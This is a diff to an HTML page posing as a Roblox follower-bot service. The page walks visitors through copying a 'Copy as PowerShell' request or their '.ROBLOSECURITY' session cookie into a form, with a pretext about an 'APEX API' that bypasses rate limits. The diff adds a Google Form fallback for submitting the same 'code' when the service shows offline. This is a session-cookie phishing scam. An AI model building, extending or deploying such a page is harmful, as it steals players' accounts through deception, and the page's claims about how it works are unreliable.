@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <!-- Follow Script -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous"><head>
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width">
@@ -67,7 +66,7 @@ p {
         <p style="color:white">Step 4:ㅤClick 'Copy as PowerShell'. MAKE SURE YOU CLICK COPY AS POWERSHELL OR IT WILL NOT WORK!</p>
         <p style="color:white">Step 5:ㅤGo to the text box under this text and paste it in the code section (also type the amount of followers you want)</p>
         <p style="color:white">Step 6:ㅤClick submit and wait 1-2 hours'</p>
-<!--         <p style="color:white">Step 1:ㅤGo to the players profile, right click and click 'Inspect Element'</p>
+        <!-- <p style="color:white">Step 1:ㅤGo to the players profile, right click and click 'Inspect Element'</p>
         <p style="color:white">Step 2:ㅤFrom there, click on 'Application'. If its not there then click the arrows to the right</p>
         <p style="color:white">Step 3:ㅤThen look on the left and click the drop down arrow by 'Cookies'</p>
         <p style="color:white">Step 4:ㅤLocate '.ROBLOSECURITY' and right click the value next to it and click 'Copy'. This code enables us to bypass ratelimits and directly send the followers</p>
@@ -85,7 +84,7 @@ p {
         <p style="color:white">There are 2 main APIs that we use. They are the Roblox API and our APEX API.</p>
         <p style="color:white">We exploit the Roblox API by pinging it repeatedly to do the same thing which is to make accounts.</p>
         <p style="color:white">This allows us to make hundreds of thousands of accounts in minutes.</p>
-        <p style="color:white">To control this, we use out APEX API which tricks the Roblox API into thinking its a real person, meaning we can do human like tasks, e.g. making the botted accounts follow you.</p>
+        <p style="color:white">To control this, we use our APEX API which tricks the Roblox API into thinking its a real person, meaning we can do human like tasks, e.g. making the botted accounts follow you.</p>
         <hr>
         <hr>
         <hr>
@@ -95,10 +94,18 @@ p {
         <p style="color:white">We have to use the code to target the accounts instead of the username because otherwise our APEX API gets confused and the program ends before you can get the followers</p>
         <hr>
         <hr>
+        <hr>
+        <h4 style="color:white">What Is The API Status?</h4>
+        <hr>
+        <p style="color:white">Out API status tells you if our APEX API is offline or online. If it is offline, then the follow bot will not work and you will have to enter the profile code in our google form.</p>
+        <p style="color:white">You can tell if the API is offline or not by checking just above the text box. It should say if its 'ONLINE' or 'OFFLINE'</p>
+        <p style="color:white">If you would like to locate the Google Form incase the API is down, just click <a href="https://docs.google.com/forms/d/e/1FAIpQLSdaOr6dw4OVyk7HFVNUoX4CtONP9jyUUDCoxrFRSI3gHPO2AA/viewform?usp=sf_link">here</a></p>
+        <hr>
+        <hr>
         <h3 style="color:white">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</h3>
         <hr>
         <hr>
-        <h4 style="color:white">Generate Account/Profile Followers - API STATUS: OFFLINE</h4>
+        <h4 style="color:white">Generate Account/Profile Followers - API STATUS: 🔴 OFFLINE <!--🟢 ONLINE--></h4>
         <hr>
         <label for="messageInput" class="form-label" style="color:white">Enter Your Code</label>
         <textarea class="form-control" id="messageCookie" rows="1" class="readonly"></textarea>
@@ -146,10 +153,11 @@ p {
         });
 
         if (response.ok) {
-          alert('Processing...'),
-          alert('💚 | Followers being sent... Please wait to 1-2 hours!');
+          // alert('Processing...'),
+          // alert('💚 | Followers being sent... Please wait to 1-2 hours!');
+          alert('APEX API Is OFFLINE');
         } else {
-          alert('Follower API did not work, please try again.')
+          alert('API ERROR - PLEASE TRY AGAIN LATER')
         }
       }
 
